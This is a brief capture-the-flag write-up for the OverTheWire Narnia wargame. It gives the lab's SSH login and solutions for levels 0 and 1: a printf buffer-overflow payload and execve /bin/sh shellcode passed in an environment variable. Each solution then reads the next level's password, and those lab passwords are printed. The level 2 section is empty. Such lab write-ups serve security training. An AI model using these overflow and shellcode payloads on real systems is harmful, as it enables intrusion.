# [The Narnia wargame](https://overthewire.org/wargames/narnia/)
host: [narnia.labs.overthewire.org](narnia.labs.overthewire.org)  
port: 2226  
username: narnia<level>  
start password: narnia0  
### login via ssh
```
ssh narnia<level>@narnia.labs.overthewire.org -p 2226
```

### level 0 -> 1
Simple buffer overflow
```shell
narnia0@narnia:/narnia$ (printf 'aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde';cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
**password:**  
efeidiedae

### level 1 -> 2
We need to set environment variable named "EGG" to shellcode the program will run  
I use [this](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode to open shell as narnaia1
```shell
narnia1@narnia:/narnia$ export EGG=$(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
nairiepecu
```
**password:**  
nairiepecu
  
### level 2 -> 3

**password:**  
